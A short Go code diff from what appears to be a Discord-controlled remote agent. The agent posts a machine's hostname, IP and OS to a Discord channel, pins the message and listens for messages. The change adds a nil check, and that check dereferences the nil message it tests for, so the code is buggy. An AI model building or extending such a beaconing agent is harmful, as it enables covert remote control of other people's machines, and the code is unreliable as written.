@@ -61,6 +61,12 @@ func main() {
 
 	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
 	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
+	//Handle if message is empty and/or bot doesn't have read permission
+	if message == nil {
+		fmt.Println("Message is empty! Check to see if Discord bot has proper channel read permissions!")
+		dg.ChannelMessageSend(message.ChannelID, "Message is empty! Check to see if Discord bot has proper channel read permissions!")
+		return
+	}
 	dg.ChannelMessagePin(channelID.ID, message.ID)
 	dg.AddHandler(messageCreater)
 
